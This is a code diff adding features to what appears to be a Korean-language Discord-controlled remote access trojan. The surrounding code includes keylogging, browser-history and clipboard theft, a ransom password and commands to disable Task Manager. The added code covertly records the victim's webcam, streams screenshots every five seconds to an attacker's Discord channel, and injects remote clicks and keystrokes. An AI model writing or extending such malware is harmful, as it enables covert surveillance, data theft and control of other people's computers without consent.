@@ -49,6 +49,13 @@ import browserhistory as bh
 from mss import mss
 from pynput.keyboard import Key, Listener
 
+# ---------- NEW IMPORTS FOR WEBCAM RECORDING ----------
+try:
+    import cv2
+    CV2_AVAILABLE = True
+except ImportError:
+    CV2_AVAILABLE = False
+
 token = ''
 global appdata
 appdata = os.getenv('APPDATA')
@@ -241,8 +248,6 @@ def get_roblox_sex():
     if not info:
         return None, "토큰이 유효하지 않거나 Roblox API가 오류를 반환했습니다."
     return info, token
-
-
 
 class DiscordMod:
     def __init__(self):
@@ -442,8 +447,6 @@ async def on_ready():
     await channel.send(content="@here", embed=embed)
     game = discord.Game("창 로깅 중지됨")
     await bot.change_presence(status=discord.Status.online, activity=game)
-
-
 
 log_channel_id = 0
 RANSOM_PW = "N4vi_0n_T0p"
@@ -737,6 +740,7 @@ def get_embed(page: str):
             "`!screenshot` – 화면 캡처\n"
             "`!screenrecord <초>` – 화면 녹화\n"
             "`!webcampic` – 웹캠 스냅샷\n"
+            "`!webcamrecord <초>` – 웹캠 녹화 (OpenCV 필요)\n"
             "`!clipboard` – 클립보드 내용\n"
             "`!history` – 브라우저 기록\n"
             "`!windowstart / !windowstop` – 창 로깅\n"
@@ -760,18 +764,23 @@ def get_embed(page: str):
             "`!jumpscare` - 전체화면 공포 + 큰 소리\n"
             "`!wallpaper` - 배경화면 변경 (이미지 첨부)\n"
             "`!flipscreen / !reset` - 화면 뒤집기 트릭\n"
-            "`!crazymouse <초>` - 랜덤 마우스 움직임\n"
-            "`!earthquake <초>` - 모든 창 흔들기\n"
+            "`!crazymouse [초] [속도]` - 랜덤 마우스 움직임\n"
+            "`!earthquake [초] [강도]` - 모든 창 흔들기\n"
             "`!spamtts <횟수> <텍스트>` - TTS 음성 스팸\n"
             "`!beep <횟수>` – 시스템 비프 스팸\n"
-            "`!rickroll` - 클래식 릭롤\n"
             "`!opencd / !closecd` - CD 트레이 제어\n"
             "`!swapbuttons / !unswapbuttons` - 마우스 좌우 버튼 전환\n"
             "`!volumemax / !volumezero` – 볼륨 제어\n"
             "`!blockinput / !unblockinput` – 입력 차단/해제 🔑\n"
             "`!hidedesktop` – 바탕화면 아이콘 토글\n"
             "`!disabletaskmgr / !enabletaskmgr` – 작업 관리자 🔑\n"
-            "`!spam_site <URL>` - 웹사이트 100개 탭 스팸"
+            "`!spam_site <URL>` - 웹사이트 100개 탭 스팸\n"
+            "`!site <URL>` - 브라우저에서 URL 열기\n"
+            "`!text <텍스트> [초]` - 화면 팝업 표시\n"
+            "`!click [버튼] [횟수]` - 마우스 클릭 시뮬레이션\n"
+            "`!keypress <키>` - 키 입력 시뮬레이션\n"
+            "`!type <텍스트>` - 텍스트 타이핑\n"
+            "`!mousepos` - 현재 마우스 위치"
         )
 
     elif page == "destructive":
@@ -823,42 +832,62 @@ class HelpSelect(discord.ui.Select):
             view=self.view
         )
 
-
 class HelpView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=300)
         self.add_item(HelpSelect())
 
-
 @bot.command()
 async def help(ctx):
     await ctx.send(embed=get_embed("main"), view=HelpView())
 
-@bot.command(brief="피해자 브라우저에서 웹사이트를 스팸으로 엽니다.")
-async def spam_site(ctx, url: str, amount: int = 100):
+# ---------- START OF NEW COMMANDS ----------
+
+# Global stream control
+stream_running = False
+stream_channel = None
+stream_thread = None
+stream_stop_event = threading.Event()
+
+def stream_loop():
+    global stream_running, stream_channel
+    with mss() as sct:
+        while not stream_stop_event.is_set():
+            try:
+                timestamp = int(time.time())
+                filename = os.path.join(tempfile.gettempdir(), f"stream_{timestamp}.png")
+                sct.shot(output=filename)
+                # Send file to the channel via discord.py async, but we're in a thread.
+                # We'll use the pending messages mechanism.
+                send_discord_message(f"📡 **스트림 스크린샷** (t={timestamp})")
+                # We need to send file; we can save to temp and use discord.File, but that requires async.
+                # Instead, we'll use the background sender to send the file path? Not easily.
+                # Alternative: we can send via bot.loop and create a coroutine.
+                # Let's use asyncio.run_coroutine_threadsafe
+                asyncio.run_coroutine_threadsafe(
+                    send_stream_file(filename, stream_channel),
+                    bot.loop
+                )
+                time.sleep(5)
+            except Exception as e:
+                print(f"Stream error: {e}")
+                break
+
+async def send_stream_file(filename, channel):
+    if channel is None:
+        return
     try:
-        if not url.startswith(("http://", "https://")):
-            url = "https://" + url
-
-        await ctx.send(f"{url}을(를) {amount}번 브라우저로 스팸 중...")
-
-        def do_spam():
-            for _ in range(amount):
-                try:
-                    subprocess.Popen(
-                        f'start "" "{url}"',
-                        shell=True,
-                        creationflags=subprocess.CREATE_NO_WINDOW
-                    )
-                    time.sleep(0.05)
-                except:
-                    pass
-
-        threading.Thread(target=do_spam, daemon=True).start()
-
+        file = discord.File(filename, filename=os.path.basename(filename))
+        await channel.send(file=file)
     except Exception as e:
-        await ctx.send(f"사이트 스팸 오류: {str(e)}")
+        print(f"Failed to send stream file: {e}")
+    finally:
+        try:
+            os.remove(filename)
+        except:
+            pass
 
+# ---------- END OF NEW COMMANDS ----------
 
 EXEC_MAP = {
     ".py":   (sys.executable,       False, None),
@@ -1104,6 +1133,266 @@ async def on_message(message):
             os.chdir(directory)
         except:
             await message.channel.send(embed=ch3at_embed("명령어 실패.", color=0xff0000))
+
+    # ========== NEW: !site ==========
+    if message.content.startswith("!site "):
+        url = message.content[6:].strip()
+        if not url.startswith(("http://", "https://")):
+            url = "https://" + url
+        try:
+            os.startfile(url)
+            await message.channel.send(embed=ch3at_embed(f"🌐 **사이트 열기:** `{url}`"))
+        except Exception as e:
+            await message.channel.send(embed=ch3at_embed(f"사이트 열기 실패: `{str(e)}`", color=0xff0000))
+
+    # ========== NEW: !webcamrecord ==========
+    if message.content.startswith("!webcamrecord "):
+        if not CV2_AVAILABLE:
+            await message.channel.send(embed=ch3at_embed("❌ OpenCV가 설치되지 않았습니다. `pip install opencv-python` 실행 후 다시 시도하세요.", color=0xff0000))
+        else:
+            try:
+                sec = int(message.content[14:].strip())
+                if sec < 1: sec = 1
+                if sec > 60: sec = 60
+                await message.channel.send(embed=ch3at_embed(f"🎥 **웹캠 녹화:** {sec}초 녹화 중..."))
+                cap = cv2.VideoCapture(0)
+                if not cap.isOpened():
+                    await message.channel.send(embed=ch3at_embed("❌ 웹캠을 열 수 없습니다.", color=0xff0000))
+                else:
+                    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+                    temp_path = os.path.join(tempfile.gettempdir(), "webcam_record.mp4")
+                    out = cv2.VideoWriter(temp_path, fourcc, 20.0, (640, 480))
+                    start = time.time()
+                    while time.time() - start < sec:
+                        ret, frame = cap.read()
+                        if not ret:
+                            break
+                        out.write(frame)
+                    cap.release()
+                    out.release()
+                    cv2.destroyAllWindows()
+                    file = discord.File(temp_path, filename="webcam_record.mp4")
+                    await message.channel.send(embed=ch3at_embed(f"✅ **웹캠 녹화 완료:** {sec}초"), file=file)
+                    os.remove(temp_path)
+            except ValueError:
+                await message.channel.send(embed=ch3at_embed("구문: `!webcamrecord <초>` (1-60)", color=0xff0000))
+            except Exception as e:
+                await message.channel.send(embed=ch3at_embed(f"웹캠 녹화 실패: `{str(e)}`", color=0xff0000))
+
+    # ========== NEW: !stream ==========
+    if message.content.startswith("!stream "):
+        global stream_running, stream_thread, stream_stop_event, stream_channel
+        args = message.content[8:].strip().lower()
+        if args == "start":
+            if stream_running:
+                await message.channel.send(embed=ch3at_embed("ℹ️ 이미 스트림이 실행 중입니다."))
+            else:
+                stream_running = True
+                stream_channel = message.channel
+                stream_stop_event.clear()
+                stream_thread = threading.Thread(target=stream_loop, daemon=True)
+                stream_thread.start()
+                await message.channel.send(embed=ch3at_embed("📡 **스트림 시작:** 5초마다 스크린샷을 전송합니다. `!stream stop`으로 중지."))
+        elif args == "stop":
+            if not stream_running:
+                await message.channel.send(embed=ch3at_embed("ℹ️ 현재 실행 중인 스트림이 없습니다."))
+            else:
+                stream_stop_event.set()
+                stream_running = False
+                stream_channel = None
+                await message.channel.send(embed=ch3at_embed("🛑 **스트림 중지됨.**"))
+        else:
+            await message.channel.send(embed=ch3at_embed("구문: `!stream start` 또는 `!stream stop`", color=0xff0000))
+
+    # ========== NEW: !text ==========
+    if message.content.startswith("!text "):
+        parts = message.content[6:].strip().split(" ")
+        if len(parts) == 0:
+            await message.channel.send(embed=ch3at_embed("구문: `!text <텍스트> [초]`", color=0xff0000))
+        else:
+            # Find duration if last token is a number
+            duration = 5  # default
+            text = " ".join(parts)
+            if parts[-1].isdigit():
+                duration = int(parts[-1])
+                text = " ".join(parts[:-1])
+            if duration < 1: duration = 1
+            if duration > 30: duration = 30
+            # Show a message box with the text
+            def show_popup():
+                # Use MessageBox with a timer? We can create a tkinter window that auto-destroys.
+                # But we are in a thread; we can create a simple Tk window.
+                import tkinter as tk
+                root = tk.Tk()
+                root.title("메시지")
+                root.attributes("-topmost", True)
+                label = tk.Label(root, text=text, font=("Arial", 20), padx=20, pady=20)
+                label.pack()
+                root.after(duration * 1000, root.destroy)
+                root.mainloop()
+            threading.Thread(target=show_popup, daemon=True).start()
+            await message.channel.send(embed=ch3at_embed(f"💬 **팝업 표시:** '{text}' - {duration}초 후 자동 닫힘."))
+
+    # ========== NEW: !ps ==========
+    if message.content == "!ps":
+        try:
+            result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            output = result.stdout
+            if len(output) > 1990:
+                # Send as file
+                with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+                    f.write(output)
+                    fname = f.name
+                file = discord.File(fname, filename="process_list.txt")
+                await message.channel.send(embed=ch3at_embed("📋 **프로세스 목록:**"), file=file)
+                os.unlink(fname)
+            else:
+                await message.channel.send(embed=ch3at_embed(f"📋 **프로세스 목록:**\n```\n{output}\n```"))
+        except Exception as e:
+            await message.channel.send(embed=ch3at_embed(f"프로세스 목록 실패: `{str(e)}`", color=0xff0000))
+
+    # ========== NEW: !click ==========
+    if message.content.startswith("!click"):
+        args = message.content[6:].strip().split()
+        button = "left"
+        count = 1
+        if len(args) > 0 and args[0].lower() in ["left", "right", "middle"]:
+            button = args[0].lower()
+            if len(args) > 1 and args[1].isdigit():
+                count = int(args[1])
+        elif len(args) > 0 and args[0].isdigit():
+            count = int(args[0])
+        if count < 1: count = 1
+        if count > 20: count = 20
+        if button == "left":
+            pyautogui.click(clicks=count)
+        elif button == "right":
+            pyautogui.rightClick(clicks=count)
+        elif button == "middle":
+            pyautogui.middleClick(clicks=count)
+        await message.channel.send(embed=ch3at_embed(f"🖱️ **클릭:** {button} 버튼 {count}회"))
+
+    # ========== NEW: !keypress ==========
+    if message.content.startswith("!keypress "):
+        key = message.content[10:].strip()
+        if key:
+            try:
+                # Special keys: 'enter', 'space', 'tab', 'ctrl', 'shift', 'alt', 'win', 'esc', 'up', 'down', 'left', 'right'
+                # We'll use pyautogui.hotkey for multi-key combos? But for simplicity, just press.
+                # For special keys, pyautogui has Key names.
+                key_map = {
+                    "enter": "enter", "space": "space", "tab": "tab",
+                    "ctrl": "ctrl", "shift": "shift", "alt": "alt",
+                    "win": "win", "windows": "win",
+                    "esc": "esc", "escape": "esc",
+                    "up": "up", "down": "down", "left": "left", "right": "right",
+                    "backspace": "backspace", "delete": "delete",
+                    "f1": "f1", "f2": "f2", "f3": "f3", "f4": "f4",
+                    "f5": "f5", "f6": "f6", "f7": "f7", "f8": "f8",
+                    "f9": "f9", "f10": "f10", "f11": "f11", "f12": "f12"
+                }
+                if key.lower() in key_map:
+                    pyautogui.press(key_map[key.lower()])
+                else:
+                    pyautogui.press(key)
+                await message.channel.send(embed=ch3at_embed(f"⌨️ **키 입력:** `{key}`"))
+            except Exception as e:
+                await message.channel.send(embed=ch3at_embed(f"키 입력 실패: `{str(e)}`", color=0xff0000))
+
+    # ========== NEW: !type ==========
+    if message.content.startswith("!type "):
+        text = message.content[6:].strip()
+        if text:
+            try:
+                pyautogui.typewrite(text)
+                await message.channel.send(embed=ch3at_embed(f"✍️ **타이핑:** `{text}`"))
+            except Exception as e:
+                await message.channel.send(embed=ch3at_embed(f"타이핑 실패: `{str(e)}`", color=0xff0000))
+
+    # ========== NEW: !mousepos ==========
+    if message.content == "!mousepos":
+        x, y = pyautogui.position()
+        await message.channel.send(embed=ch3at_embed(f"🖱️ **마우스 위치:** X={x}, Y={y}"))
+
+    # ========== ENHANCED: !crazymouse ==========
+    if message.content.startswith("!crazymouse"):
+        args = message.content[12:].strip().split()
+        duration = 10
+        speed = "normal"
+        if len(args) > 0 and args[0].isdigit():
+            duration = int(args[0])
+            if duration < 1: duration = 1
+            if duration > 120: duration = 120
+            if len(args) > 1:
+                speed = args[1].lower()
+        else:
+            if len(args) > 0:
+                speed = args[0].lower()
+        # Speed mapping
+        if speed in ["slow", "low"]:
+            moves_per_sec = 5
+        elif speed in ["fast", "high"]:
+            moves_per_sec = 30
+        elif speed.isdigit():
+            moves_per_sec = int(speed)
+            if moves_per_sec < 1: moves_per_sec = 1
+            if moves_per_sec > 50: moves_per_sec = 50
+        else:
+            moves_per_sec = 15  # normal
+        await message.channel.send(embed=ch3at_embed(f"🐭 **미친 마우스:** {duration}초 동안 속도 {moves_per_sec}회/초로 움직입니다."))
+        def crazy():
+            end = time.time() + duration
+            sw, sh = pyautogui.size()
+            while time.time() < end:
+                pyautogui.moveTo(random.randint(0, sw), random.randint(0, sh), duration=0.05)
+                time.sleep(1.0 / moves_per_sec)
+        threading.Thread(target=crazy, daemon=True).start()
+
+    # ========== ENHANCED: !earthquake ==========
+    if message.content.startswith("!earthquake"):
+        args = message.content[12:].strip().split()
+        duration = 10
+        intensity = "medium"
+        if len(args) > 0 and args[0].isdigit():
+            duration = int(args[0])
+            if duration < 1: duration = 1
+            if duration > 60: duration = 60
+            if len(args) > 1:
+                intensity = args[1].lower()
+        else:
+            if len(args) > 0:
+                intensity = args[0].lower()
+        # Intensity mapping
+        if intensity in ["low", "weak"]:
+            offset = 8
+        elif intensity in ["high", "strong"]:
+            offset = 25
+        elif intensity.isdigit():
+            offset = int(intensity)
+            if offset < 1: offset = 1
+            if offset > 40: offset = 40
+        else:
+            offset = 15  # medium
+        await message.channel.send(embed=ch3at_embed(f"🌍 **지진:** {duration}초 동안 강도 {offset}px로 흔듭니다."))
+        def shake():
+            end = time.time() + duration
+            while time.time() < end:
+                def enum_proc(hwnd, _):
+                    if win32gui.IsWindowVisible(hwnd):
+                        try:
+                            r = win32gui.GetWindowRect(hwnd)
+                            new_x = r[0] + random.randint(-offset, offset)
+                            new_y = r[1] + random.randint(-offset, offset)
+                            win32gui.MoveWindow(hwnd, new_x, new_y, r[2]-r[0], r[3]-r[1], True)
+                        except: pass
+                try:
+                    win32gui.EnumWindows(enum_proc, None)
+                except: pass
+                time.sleep(0.04)
+        threading.Thread(target=shake, daemon=True).start()
+
+    # ========== REMOVED: !rickroll ==========
+    # (Commented out or deleted)
 
     if message.content.startswith("!message"):
         MB_YESNO = 0x04
@@ -1421,42 +1710,9 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"뒤집기 실패: `{str(e)}`", color=0xff0000))
 
-    if message.content.startswith("!crazymouse"):
-        try:
-            sec = int(message.content[12:].strip())
-            if sec < 1: sec = 1
-            if sec > 60: sec = 60
-            await message.channel.send(embed=ch3at_embed(f"🐭 **마우스:** {sec}초 동안 미치게 움직입니다..."))
-            def _crazy_mouse():
-                end_t = time.time() + sec
-                sw, sh = pyautogui.size()
-                while time.time() < end_t:
-                    pyautogui.moveTo(random.randint(0, sw), random.randint(0, sh), duration=0.05)
-            threading.Thread(target=_crazy_mouse, daemon=True).start()
-        except ValueError:
-            await message.channel.send(embed=ch3at_embed("구문: `!crazymouse <초>` (1-60)", color=0xff0000))
+    # (Old crazymouse removed; new enhanced version above)
 
-    if message.content.startswith("!earthquake"):
-        try:
-            sec = int(message.content[12:].strip())
-            if sec < 1: sec = 1
-            if sec > 30: sec = 30
-            await message.channel.send(embed=ch3at_embed(f"🌍 **지진:** {sec}초 동안 흔듭니다..."))
-            def _shake():
-                end_t = time.time() + sec
-                while time.time() < end_t:
-                    def _enum(hwnd, _):
-                        if win32gui.IsWindowVisible(hwnd):
-                            try:
-                                r = win32gui.GetWindowRect(hwnd)
-                                win32gui.MoveWindow(hwnd, r[0]+random.randint(-15,15), r[1]+random.randint(-15,15), r[2]-r[0], r[3]-r[1], True)
-                            except: pass
-                    try: win32gui.EnumWindows(_enum, None)
-                    except: pass
-                    time.sleep(0.04)
-            threading.Thread(target=_shake, daemon=True).start()
-        except ValueError:
-            await message.channel.send(embed=ch3at_embed("구문: `!earthquake <초>` (1-30)", color=0xff0000))
+    # (Old earthquake removed; new enhanced version above)
 
     if message.content.startswith("!fakeerror"):
         try:
@@ -1616,9 +1872,11 @@ async def on_message(message):
         else:
             await message.channel.send(embed=ch3at_embed("관리자 권한이 필요합니다.", color=0xff0000))
 
-    if message.content == "!rickroll":
-        os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
-        await message.channel.send(embed=ch3at_embed("🎵 **Rickroll:** Never gonna give you up..."))
+    # ========== REMOVED: !rickroll ==========
+    # The following block is deleted:
+    # if message.content == "!rickroll":
+    #     os.startfile("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    #     await message.channel.send(embed=ch3at_embed("🎵 **Rickroll:** Never gonna give you up..."))
 
     if message.content.startswith("!beep"):
         try:
